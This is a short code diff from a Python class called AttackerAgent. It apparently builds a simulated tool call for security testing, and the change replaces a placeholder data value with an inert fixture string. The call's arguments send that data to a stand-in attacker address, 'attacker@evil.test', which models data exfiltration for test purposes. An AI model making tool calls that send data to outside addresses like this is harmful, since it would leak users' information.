@@ -138,7 +138,7 @@ class AttackerAgent:
             call_id=f"call:{uuid.uuid4()}",
             tool_name=tool_name,
             arguments={
-                "data": "DEMO_SECRET_PLACEHOLDER",
+                "data": "test:exfil-fixture",   # R023-001 — valeur inerte, pas un vrai secret
                 "target": "attacker@evil.test",
             },
             agent_source=self.AGENT_ID,
